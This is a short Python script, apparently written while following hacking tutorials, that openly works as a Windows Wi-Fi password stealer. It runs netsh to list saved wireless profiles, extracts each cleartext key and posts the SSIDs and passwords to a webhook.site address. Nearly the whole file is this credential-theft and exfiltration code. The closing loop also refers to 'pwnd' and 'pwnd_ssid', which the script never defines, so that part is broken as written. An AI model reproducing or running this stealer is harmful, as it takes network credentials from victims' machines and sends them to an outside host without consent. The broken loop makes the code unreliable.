#!/usr/bin/env python3
#**!!Both of these were made from tutorials of TCM-The Cyber Mentor!!**
#https://github.com/hmaverickadams

# Specifically steals Windows WiFi Passwords
import subprocess, os, sys, requests, re, urllib
# requests may need to be installed NOT STANDARD

# To ship out pass could use a site like webhook.site
# gens unique url, copy it and use it here
### Stealer URL
url = 'https://webhook.site/###################'

# Lists and regex
disc_ssids = []
ownd = []
wifi_profile_regex = r"All User Profile\s+:\s(.*)$"
wifi_key_regex = r"Key Content\s+:\s(.*)$"

# Use Python to exec Win cmd
get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

# Append found SSIDs to list
matches = re.finditer(wifi_profile_regex, get_profiles_command, re.MULTILINE)
for match in matches:
    for group in match.groups():
        disc_ssids.append(group.strip())

# Get cleartext password for found SSIDs and place into ownd list
for ssid in disc_ssids:
    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
    matches = re.finditer(wifi_key_regex, get_keys_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            ownd.append({
                "SSID":ssid,
                "Password":group.strip()
                }) 

#Check if any ownd Wi-Fi exists, if not exit
if len(ownd) == 0:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

print("Wi-Fi profiles found. Check your webhook...")

#Send the hackies to your webhookz
final_payload = ""
for ownd_ssid in pwnd:
    final_payload += "[SSID:%s, Password:%s]\n" % (ownd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired

r = requests.post(url, params="format=json", data=final_payload)
